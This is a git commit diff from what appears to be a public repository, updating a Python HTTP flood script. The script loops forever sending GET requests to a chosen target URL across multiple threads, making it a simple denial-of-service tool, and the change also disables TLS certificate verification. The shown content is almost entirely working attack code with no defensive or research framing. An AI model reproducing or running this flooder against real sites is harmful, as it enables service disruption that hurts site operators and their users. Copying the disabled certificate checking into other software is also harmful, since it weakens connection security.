f07fcc7e2a8b97537baa00b5aff442e25c125a85
Ameer <114929844+Ameer-clk@users.noreply.github.com>
2024-03-25 02:42:43 -0400

    Update httpflood.py

--- HttpFlood/httpflood.py
+++ HttpFlood/httpflood.py
@@ -4,13 +4,13 @@ import threading
 def flood(url):
     while True:
         try:
-            response = requests.get(url)
+            response = requests.get(url, verify=False)
             print(f"Sent request to {url}")
         except requests.exceptions.RequestException as e:
             print(f"Error: {e}")
 
 # Enter the URL you want to flood
-target_url = "http://example"
+target_url = "https://example.com"
 
 # Enter the number of threads you want to use for flooding
 num_threads = 10
